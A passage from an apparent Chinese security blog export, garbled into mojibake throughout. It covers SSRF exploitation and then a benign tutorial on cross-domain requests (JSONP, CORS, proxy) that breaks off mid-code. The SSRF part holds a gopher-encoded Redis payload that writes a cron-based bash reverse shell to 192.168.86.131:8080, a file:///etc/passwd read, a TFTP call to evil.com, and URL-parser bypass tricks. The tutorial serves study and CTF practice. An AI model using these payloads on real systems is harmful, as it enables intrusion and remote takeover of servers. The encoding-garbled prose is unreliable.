<li><p>ç©ºç™½è¡Œæ›¿æ¢ä¸º%0a<br>æ„é€ gopheråè®®åˆ©ç”¨ï¼š<br><em>1%0d%0a$8%0d%0aflushall%0d%0a</em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.86.131&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%0d%0aquit%0d%0a<br>å¦‚æœè¦æ¢IPå’Œç«¯å£ï¼Œå‰é¢çš„$61ä¹Ÿéœ€è¦æ›´æ”¹ï¼Œ$61è¡¨ç¤ºå­—ç¬¦ä¸²é•¿åº¦ä¸º61ä¸ªå­—èŠ‚ï¼Œä¸Šé¢çš„EXPå³æ˜¯%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.86.131&#x2F;8080 0&gt;&amp;1%0a%0a%0a%0aï¼Œ3+54+4&#x3D;58ã€‚<br>æœ¬åœ°curlæµ‹è¯•ï¼Œè¿”å›4ä¸ªOKè¯´æ˜æˆåŠŸæ‰§è¡Œ</p>
</li>
</ul>
<p><strong>file</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/?url=file:///etc/passwd</span><br><span class="line">http://192.168.37.18/ssrf/?url=file:///E:/readme.txt</span><br></pre></td></tr></table></figure>

<p><strong>ldap</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://safebuff.com/redirect.php?url=ldap://localhost:11211/%0astats%0aquit</span><br></pre></td></tr></table></figure>

<p><strong>TFTP</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET</span><br><span class="line"></span><br><span class="line">evil.com:</span><br><span class="line"><span class="comment"># nc -v -u -l 12346Listening on [0.0.0.0] (family 0, port 12346)TESTUDPPACKEToctettsize0blksize512timeout6</span></span><br></pre></td></tr></table></figure>

<h3 id="ç»•è¿‡æŠ€å·§"><a href="#ç»•è¿‡æŠ€å·§" class="headerlink" title="ç»•è¿‡æŠ€å·§"></a>ç»•è¿‡æŠ€å·§</h3><p>1.åˆ©ç”¨302è·³è½¬ç»•è¿‡åè®®é™åˆ¶</p>
<p>2.127 æ®µå…¨éƒ¨éƒ½æ˜¯æœ¬åœ°åœ°å€ ç»•è¿‡å¯¹127.0.0.1çš„é™åˆ¶</p>
<p>3.å·¥å…·æ¢æµ‹-&gt;<a href="https://github.com/swisskyrepo/SSRFmap">ssrfmap</a></p>
<h3 id="CTFæŠ€å·§"><a href="#CTFæŠ€å·§" class="headerlink" title="CTFæŠ€å·§"></a>CTFæŠ€å·§</h3><h5 id="phpä¸­çš„parse-urlå’Œlibcurl"><a href="#phpä¸­çš„parse-urlå’Œlibcurl" class="headerlink" title="phpä¸­çš„parse_urlå’Œlibcurl"></a>phpä¸­çš„parse_urlå’Œlibcurl</h5><p>é¢˜ç›®ï¼ˆä¸€ä¸ªSSRFåˆ©ç”¨mysqlçš„é¢˜ç›®ï¼‰ä¸æ”¾äº†ï¼Œè¿™é‡Œä¹Ÿä¸æ˜¯å†™CTFè§£é¢˜è¿‡ç¨‹çš„ï¼Œå¤§æ¦‚ä»£ç æµç¨‹ï¼š</p>
<p><code>url-&gt;php parse_urlï¼ˆè¿‡æ»¤ipï¼‰-&gt;è¿‡æ»¤urlå„éƒ¨åˆ†(ç©ºç™½å­—ç¬¦å’Œæ•°å­—)-&gt;curlå‘é€è¯·æ±‚</code></p>
<p>å¯åˆ©ç”¨parse_urlå’Œlibcurlå¯¹urlè§£æçš„å·®å¼‚æ¥ç»•è¿‡ã€‚</p>
<p>å®Œæ•´url: <code>bash scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment] </code><br>è¿™é‡Œä»…è®¨è®ºurlä¸­ä¸å«â€™?â€™çš„æƒ…å†µ</p>
<p>php parse_urlï¼š<br>host: åŒ¹é…æœ€åä¸€ä¸ª@åé¢ç¬¦åˆæ ¼å¼çš„host</p>
<p>libcurlï¼š<br>hostï¼šåŒ¹é…ç¬¬ä¸€ä¸ª@åé¢ç¬¦åˆæ ¼å¼çš„host</p>
<p>å¦‚ï¼š<a href="http://u:p%40a.com%3A80@b.com/">http://u:p@a.com:80@b.com/</a></p>
<p>phpè§£æç»“æœï¼š<br>    schema: http<br>    host: b.com<br>    user: u<br>    pass: <a href="mailto:&#x70;&#64;&#97;&#46;&#x63;&#x6f;&#109;">&#x70;&#64;&#97;&#46;&#x63;&#x6f;&#109;</a>:80<br>libcurlè§£æç»“æœï¼š<br>    schema: http<br>    host: a.com<br>    user: u<br>    pass: p<br>    port: 80<br>    åé¢çš„@b.com&#x2F;ä¼šè¢«å¿½ç•¥æ‰</p>
<p>æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªURLåœ°å€ï¼Œç”¨æ¥è®©phpè®¤ä¸ºhostæ˜¯b.com è€Œlibcurlå®é™…è¯·æ±‚å¦ä¸€ä¸ªåŸŸåã€‚</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>:p:@a.com:<span class="number">3306</span>@b.com/</span><br><span class="line">http:<span class="regexp">//u</span>:@a.com:<span class="number">3306</span>@b.com/</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¼€å¤´æµç¨‹ä¸­è¯´æ˜äº†phpè§£æURLåä¼šè¿‡æ»¤ç©ºç™½å­—ç¬¦å’Œæ•°å­—ã€‚æ•°å­—ä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ï¼Œa.com:3306æ˜¯ä¸è¡Œçš„ï¼Œ3306åªèƒ½æ”¾åœ¨æœ€åï¼Œä½†æ˜¯æ”¾åœ¨æœ€åç«¯å£å°±æ— æ³•è¢«curlè·å–åˆ°ï¼Œä½†æ˜¯æ ¹æ®rfc3986è§„å®šå¯ä»¥ï¼š<br>gopher:&#x2F;&#x2F;foo@[cafebabe.cf]@yolo.com:3306</p>
<blockquote>
<p>A host identified by an Internet Protocol literal address, version 6 or later, is distinguished by enclosing the IP literal within square brackets (â€œ[â€œ and â€œ]â€œ). This is the only place where square bracket characters are allowed in the URI syntax.<br>IP-literal &#x3D; â€œ[â€œ ( IPv6address &#x2F; IPvFuture ) â€œ]â€<br>ä¹Ÿå°±æ˜¯è¯´[ip]æ˜¯ä¸€ç§hostçš„å½¢å¼ï¼Œlibcurlåœ¨è§£ææ—¶å€™è®¤ä¸º[]åŒ…è£¹çš„æ˜¯host</p>
</blockquote>
<p>è¿˜æœ‰ä¸€ç§åå…­è¿›åˆ¶è¡¨ç°å½¢å¼<br>gopher:&#x2F;&#x2F;foo@localhost:<a href="mailto:&#102;&#x40;&#114;&#x69;&#x63;&#116;&#101;&#x72;&#122;&#46;&#x6d;&#101;">&#102;&#x40;&#114;&#x69;&#x63;&#116;&#101;&#x72;&#122;&#46;&#x6d;&#101;</a>:3306&#x2F;</p>
<h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul>
<li><a href="http://tools.40huo.cn/#!papers.md">ã€ŠBuild Your SSRF EXP Autoworkã€‹çŒªçŒªä¾ </a></li>
<li><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html">è…¾è®¯æŸå¤„ SSRF æ¼æ´ï¼ˆéå¸¸å¥½çš„åˆ©ç”¨ç‚¹ï¼‰é™„åˆ©ç”¨è„šæœ¬</a></li>
<li><a href="https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html">bilibili æŸåˆ†ç«™ä»ä¿¡æ¯æ³„éœ²åˆ° ssrf å†åˆ°å‘½ä»¤æ‰§è¡Œ</a></li>
<li><a href="https://www.freebuf.com/articles/web/159342.html">ä»ä¸€é“CTFé¢˜ç›®çœ‹Gopheræ”»å‡»Mysql</a></li>
<li><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">gopheråœ¨ssrfä¸­æ”»å‡»å†…ç½‘çš„ç¤ºä¾‹</a></li>
</ul>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>æµè§ˆå™¨è·¨åŸŸçš„å‡ ç§å®ç°</title>
    <url>//posts/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%B7%A8%E5%9F%9F%E7%9A%84%E5%87%A0%E7%A7%8D%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åŒæºç­–ç•¥æ˜¯æµè§ˆå™¨å®‰å…¨ç­–ç•¥çš„æ ¸å¿ƒï¼ŒéåŒæºä¸å¾—äº¤äº’ï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¸€å®¶å…¬å¸æœ‰è‡ªå·±çš„ä¸åŒä¸šåŠ¡ï¼Œä¸åŒçš„å­åŸŸåï¼Œæˆ–è€…è¯´æœ‰åˆä½œæ–¹ï¼Œä¸åŒçš„åŸŸåç«¯å£éœ€è¦äº¤äº’æ•°æ®å‘¢ã€‚è¿™å°±æ˜¯è·¨åŸŸçš„éœ€æ±‚ã€‚</p>
<p>è·¨åŸŸç›®å‰ä¸€èˆ¬å¸¸è§ä¸¤ç§æ–¹å¼ï¼šJsonpã€CORSã€ä»£ç†ã€‚</p>
<h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>jsåœ¨scriptæ ‡ç­¾ä¸­æ˜¯ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ï¼Œæˆ‘ä»¬ä¹Ÿç»å¸¸èƒ½çœ‹åˆ°<code>&lt;script src=&quot;http://xxx.xxx.xx.x/xxx.js&quot;&gt;</code>ï¼Œå½“ç„¶imgä¹Ÿä¸å—é™åˆ¶ï¼Œä½†æ˜¯imgä¸å¤ªå¥½åšåç»­æ•°æ®çš„å¤„ç†ã€‚</p>
<p>jsonpçš„æ ¸å¿ƒæ˜¯åœ¨å‰ç«¯åŠ¨æ€åˆ›å»ºä¸€ä¸ªscriptæ ‡ç­¾ã€‚å¹¶è®¾ç½®srcå±æ€§æŒ‡å‘è·¨åŸŸçš„æœåŠ¡å™¨ã€‚æœåŠ¡å™¨è¿”å›åŒ…å«jsonæ•°æ®çš„javascriptå‡½æ•°ã€‚å‰ç«¯æ¥å—åˆ°å¯¹åº”å‡½æ•°å’Œå¯¹åº”çš„æ•°æ®ï¼Œç›´æ¥æ‰§è¡Œå¤„ç†å°±æ‹¿åˆ°äº†æˆ‘ä»¬æƒ³è°ƒç”¨æ¥å£æ‹¿åˆ°çš„æ•°æ®ã€‚</p>
<p><strong>demo</strong></p>
<p>æˆ‘ä»¬å®ç°ä¸€ä¸ªdemoï¼Œåç«¯ç”¨æˆ‘æ¯”è¾ƒç†Ÿæ‚‰çš„Flask</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡è®¾è¿™æ˜¯ä¸€ä¸ªè¿”å›JSONPå“åº”çš„æœåŠ¡ç«¯ç‚¹</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jsonp&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jsonp_demo</span>():</span><br><span class="line">    <span class="comment"># è·å¾—å®¢æˆ·ç«¯ä¼ é€’çš„å›è°ƒå‡½æ•°åç§°</span></span><br><span class="line">    callback = request.args.get(<span class="string">&#x27;callback&#x27;</span>, <span class="string">&#x27;callbackFunction&#x27;</span>)</span><br><span class="line">    data = &#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">123</span>&#125;  <span class="comment"># è¿™é‡Œæ˜¯æˆ‘ä»¬æƒ³è¦ä¼ é€’ç»™å®¢æˆ·ç«¯çš„æ•°æ®</span></span><br><span class="line">    response = <span class="string">f&quot;<span class="subst">&#123;callback&#125;</span>(<span class="subst">&#123;data&#125;</span>)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœ‰æµè§ˆå™¨è®¿é—®&#x2F;jsonpæ¥å£å°±ä¼šè·å–å›è°ƒå‡½æ•°çš„åç§°ï¼Œç„¶åæŠŠè¿™ä¸ªæ¥å£éœ€è¦ä¼ é€’çš„æ•°æ®å°è£…è¿›å»ã€‚ç„¶åå‰ç«¯ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// å®šä¹‰å¤„ç†JSONPå“åº”çš„å›è°ƒå‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">handleJSONPResponse</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received data:&#x27;</span>, data);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        // åŠ¨æ€æ·»åŠ <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">æ ‡ç­¾è¿›è¡Œè·¨åŸŸè¯·æ±‚</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        <span class="keyword">function</span> <span class="title function_">requestJSONP</span>(<span class="params">url, callbackName</span>) &#123;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">            <span class="keyword">var</span> scriptTag = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">            scriptTag.<span class="property">src</span> = url + <span class="string">&#x27;?callback=&#x27;</span> + callbackName; <span class="comment">// æ·»åŠ callbackå‚æ•°åˆ°URL</span></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">            <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(scriptTag);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        <span class="comment">// è°ƒç”¨JSONPè¯·æ±‚</span></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        <span class="comment">// æ³¨æ„æ›´æ”¹URLä¸­çš„ç«¯å£å·ä¸ºä½ çš„FlaskæœåŠ¡å™¨è¿è¡Œçš„ç«¯å£å·</span></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">        <span class="title function_">requestJSONP</span>(<span class="string">&#x27;http://localhost:5000/jsonp&#x27;</span>, <span class="string">&#x27;handleJSONPResponse&#x27;</span>);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">    </span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>JSONPè·¨åŸŸè¯·æ±‚ç¤ºä¾‹<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‰ç«¯è¯·æ±‚<a href="http://localhost:5000/jsonp%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%B9%B6%E8%8E%B7%E5%8F%96%E4%BA%86%E6%95%B0%E6%8D%AE%E6%89%93%E5%8D%B0%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E4%BD%BF%E7%94%A8jsonp%EF%BC%8C%E9%82%A3%E4%B9%88%E7%9B%B4%E6%8E%A5%E5%9C%A8%E5%BD%93%E5%89%8D%E5%9F%9F%E4%B8%8B%E8%AF%B7%E6%B1%82%E5%88%AB%E7%9A%84%E5%9F%9F%E7%9A%84%E6%8E%A5%E5%8F%A3%E6%98%AF%E4%B8%8D%E5%90%88%E6%B3%95%E7%9A%84%E3%80%82%E6%89%80%E4%BB%A5jsonp%E8%A7%A3%E5%86%B3%E4%BA%86%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E3%80%82">http://localhost:5000/jsonpæ¥å£ï¼Œå¹¶è·å–äº†æ•°æ®æ‰“å°ã€‚å¦‚æœä¸ä½¿ç”¨jsonpï¼Œé‚£ä¹ˆç›´æ¥åœ¨å½“å‰åŸŸä¸‹è¯·æ±‚åˆ«çš„åŸŸçš„æ¥å£æ˜¯ä¸åˆæ³•çš„ã€‚æ‰€ä»¥jsonpè§£å†³äº†è·¨åŸŸé—®é¢˜ã€‚</a></p>
<p>ä¼˜ç‚¹ï¼šç®€å•é«˜æ•ˆå…¼å®¹æ€§å¥½</p>
<p>ç¼ºç‚¹ï¼šåªæ”¯æŒGETè¯·æ±‚ï¼Œè¿˜æœ‰xssæ¼æ´çš„å¥‰çŒ®ã€‚ï¼ˆsrcçš„ä½å±çš„ä¸»è¦è´¡çŒ®æ¼æ´ğŸ˜‚ï¼‰</p>
<h2 id="CORSè·¨åŸŸ"><a href="#CORSè·¨åŸŸ" class="headerlink" title="CORSè·¨åŸŸ"></a>CORSè·¨åŸŸ</h2><p>æœ‰äº›äººçœ‹å®Œä¸Šé¢çš„jsonpè·¨åŸŸå¯èƒ½æƒ³ï¼Œä¸ºå•¥ä¸èƒ½scriptæ ‡ç­¾é‡Œé¢æ‰§è¡ŒAJAXçš„åŠ¨æ€è¯·æ±‚å‘¢ï¼Ÿ</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX Request to Baidu<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// åˆ›å»ºXMLHttpRequestå¯¹è±¡</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// é…ç½®è¯·æ±‚æ–¹æ³•ã€URLä»¥åŠå¼‚æ­¥å¤„ç†</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://www.baidu.com&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// è®¾ç½®çŠ¶æ€å˜åŒ–å›è°ƒå¤„ç†è¯·æ±‚ç»“æœ</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// ä»…å½“è¯·æ±‚å®Œæˆä¸”å“åº”å°±ç»ªæ—¶æ‰è¿è¡Œ</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// æ£€æŸ¥HTTPå“åº”çŠ¶æ€ç æ˜¯å¦ä¸º200 OK</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// è¿™é‡Œå¯ä»¥è·å–åˆ°è¿”å›å†…å®¹è¿›è¡Œå¤„ç†ï¼Œä¾‹å¦‚æ‰“å°åˆ°æ§åˆ¶å°</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// è¯·æ±‚å¤±è´¥å¤„ç†</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;AJAX Request to Baidu failed&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// å‘é€HTTPè¯·æ±‚</span></span></span><br><span class="line"><span class="language-javascript">            xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img data-src="/images/pages/image-20240313105201430.png" alt="image-20240313105201430" style="zoom:50%;" />

<p>å¯ä»¥çœ‹åˆ°ä»ç„¶è¢«åŒæºç­–ç•¥é™åˆ¶ã€‚</p>
<p>æ€ä¹ˆè§£å†³å‘¢ï¼Ÿè¿™é‡Œå°±æ˜¯CORSäº†ã€‚</p>
<p>1ã€å½“æµè§ˆå™¨å‘èµ·è·¨åŸŸè¯·æ±‚ï¼Œå®ƒä¼šå…ˆå‘é€ä¸€ä¸ªâ€œé¢„æ£€(Preflight)â€è¯·æ±‚ï¼Œè¯¥è¯·æ±‚é‡‡ç”¨<code>OPTIONS</code>æ–¹æ³•ï¼Œå¹¶æºå¸¦è¯¸å¦‚<code>Origin</code>ã€<code>Access-Control-Request-Method</code>å’Œ<code>Access-Control-Request-Headers</code>ä¹‹ç±»çš„ç‰¹å®šå¤´ä¿¡æ¯ï¼Œè¯¢é—®æœåŠ¡å™¨æ˜¯å¦æ„¿æ„æ¥å—è·¨æºè¯·æ±‚ã€‚</p>
<p>2ã€æœåŠ¡å™¨çš„å›åº”æ˜¯å…³é”®æ‰€åœ¨ã€‚å¦‚æœæœåŠ¡å™¨å‡†è®¸ï¼Œå®ƒä¼šå›å¤ä¸€ä¸ªåŒ…å«<code>Access-Control-Allow-Origin</code>ã€<code>Access-Control-Allow-Methods</code>ç­‰å¤´ä¿¡æ¯çš„â€œé¢„æ£€å“åº”â€ï¼Œæ˜ç¡®å‘Šè¯‰æµè§ˆå™¨å“ªäº›è·¨åŸŸè¡Œä¸ºæ˜¯è¢«è®¸å¯çš„ã€‚</p>
<p>3ã€ä¸€æ—¦æœåŠ¡å™¨çš„â€œé¢„æ£€å“åº”â€äº®ç»¿ç¯ï¼Œæµè§ˆå™¨éšå³ä¼šå‘é€æ­£å¼çš„è¯·æ±‚ã€‚æœåŠ¡å™¨æ­¤æ—¶é€šè¿‡æ£€æŸ¥è¯·æ±‚å¤´çš„<code>Origin</code>å­—æ®µï¼Œå†³å®šæ˜¯å¦å…è®¸è®¿é—®èµ„æºï¼Œå¹¶åœ¨å“åº”å¤´ä¸­åŒ…å«<code>Access-Control-Allow-Origin</code>å­—æ®µï¼Œåˆ—æ˜å“ªäº›åŸŸåå¯ä»¥æ¥æ”¶å“åº”æ•°æ®ã€‚</p>
<p>CORSä¸ä»…ä»…æ˜¯å…³äºXMLHttpRequestè¯·æ±‚çš„ï¼Œå®ƒè¿˜æ¶µç›–äº†å…¶ä»–å®‰å…¨æœºåˆ¶ï¼ŒåŒ…æ‹¬å¯¹cookieså’Œè®¤è¯çš„å¤„ç†ã€‚å¤§å¤šæ•°ç°ä»£æµè§ˆå™¨éƒ½å·²æ”¯æŒCORSï¼Œä½†ä¸€äº›æ—§ç‰ˆçš„æµè§ˆå™¨ï¼Œåƒæ˜¯IE10åŠå…¶ä»¥ä¸‹ç‰ˆæœ¬ï¼Œåˆ™ä¸æ”¯æŒè¿™é¡¹åŠŸèƒ½ã€‚</p>
<h2 id="ä»£ç†å®ç°è·¨åŸŸ"><a href="#ä»£ç†å®ç°è·¨åŸŸ" class="headerlink" title="ä»£ç†å®ç°è·¨åŸŸ"></a>ä»£ç†å®ç°è·¨åŸŸ</h2><p>æˆ‘ä»¬å¯ä»¥å®ç°ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ¥å®ç°è·¨åŸŸï¼Œä¹Ÿå°±æ˜¯Aå’ŒBåŸŸä¹‹é—´æœ‰ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ã€‚å¹³å¸¸æˆ‘ä»¬å†™pythonä»£ç ç”¨requetsè¯·æ±‚ç™¾åº¦ï¼Œä»æ¥æ²¡æœ‰äººæ‹¦æˆªæˆ‘ä»¬å¯¹å§ï¼Œå› ä¸ºæˆ‘ä»¬ä¸æ˜¯åœ¨æµè§ˆå™¨æ“ä½œï¼Œé‚£æˆ‘ä»¬å¯ä»¥è¯·æ±‚ä¸€ä¸ªæˆ‘ä»¬è‡ªèº«çš„æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä»ä»£ç å±‚å†å»å¦ä¸€ä¸ªæœåŠ¡å™¨æ‹¿æ•°æ®å†è¿”å›ç»™å‰ç«¯ï¼Œé‚£è¿™ä¸ªæ¥å£å°±æ˜¯ä¸€ä¸ªä»£ç†ã€‚</p>
<p>é€šè¿‡å®ç°ä»£ç†æ¥å®ç°è·¨åŸŸä¹Ÿæ˜¯ä¸€ç§æ–¹æ³•ï¼Œä½†æ˜¯å¥½åƒä¸å¤ªå¤šè§ã€‚</p>
<p>æœåŠ¡ç«¯ä»£ç†ä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">&#x27;node-fetch&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>; <span class="comment">// ä»£ç†æœåŠ¡å™¨ç«¯å£</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…è®¸è·¨åŸŸ</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 